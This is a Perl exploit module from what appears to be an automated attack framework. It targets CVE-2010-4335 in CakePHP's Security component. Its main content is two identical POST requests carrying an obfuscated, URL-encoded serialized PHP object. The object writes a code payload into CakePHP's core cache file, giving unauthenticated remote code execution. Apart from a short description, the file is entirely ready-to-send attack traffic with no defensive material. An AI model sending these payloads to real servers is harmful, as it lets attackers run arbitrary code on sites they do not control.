package CAKEPHP::MSF::CakephpCacheCorruption;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "CakephpCacheCorruption";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CTYPE => "application/x-www-form-urlencoded",
  CVE => "CVE-2010-4335",
  DESCRIPTION => "

        CakePHP is a popular PHP framework for building web applications.  The

        Security component of CakePHP versions 1.3.5 and earlier and 1.2.8 and

        earlier is vulnerable to an unserialize attack which could be abused to

        allow unauthenticated attackers to execute arbitrary code with the

        permissions of the webserver.

      ",
  MSF_MODULE => "cakephp_cache_corruption",
  OSVDB => 69352,
  TITLE => "CakePHP Cache Corruption Code Execution",


  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT191 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => 'data%5b_Token%5d%5bkey%5d=TykgOCj&data%5b_Token%5d%5bfields%5d=XlVWQ9KA%3AB%3A3%3A%22Ncc%22%3A4%3A%7Bf%3A7%3A%22__pnpur%22%3Bf%3A3%3A%22onz%22%3Bf%3A5%3A%22__znc%22%3Bn%3A2%3A%7Bf%3A4%3A%22Pber%22%3Bn%3A1%3A%7Bf%3A6%3A%22Ebhgre%22%3Bf%3A42%3A%22..%2Fgzc%2Fpnpur%2Fcrefvfgrag%2Fpnxr_pber_svyr_znc%22%3B%7Df%3A3%3A%22Sbb%22%3Bf%3A17%3A%22%3C%3F+__CNLYBNQ__+%3F%3E%22%3B%7Df%3A7%3A%22__cnguf%22%3Bn%3A0%3A%7B%7Df%3A9%3A%22__bowrpgf%22%3Bn%3A0%3A%7B%7D%7D&_method=POST&',
      TEXT   => 'Sending Exploit #191 Request : [POST] /',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => 'data%5b_Token%5d%5bkey%5d=TykgOCj&data%5b_Token%5d%5bfields%5d=XlVWQ9KA%3AB%3A3%3A%22Ncc%22%3A4%3A%7Bf%3A7%3A%22__pnpur%22%3Bf%3A3%3A%22onz%22%3Bf%3A5%3A%22__znc%22%3Bn%3A2%3A%7Bf%3A4%3A%22Pber%22%3Bn%3A1%3A%7Bf%3A6%3A%22Ebhgre%22%3Bf%3A42%3A%22..%2Fgzc%2Fpnpur%2Fcrefvfgrag%2Fpnxr_pber_svyr_znc%22%3B%7Df%3A3%3A%22Sbb%22%3Bf%3A17%3A%22%3C%3F+__CNLYBNQ__+%3F%3E%22%3B%7Df%3A7%3A%22__cnguf%22%3Bn%3A0%3A%7B%7Df%3A9%3A%22__bowrpgf%22%3Bn%3A0%3A%7B%7D%7D&_method=POST&',
      TEXT   => 'Sending Exploit #1 Request : [POST] /',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
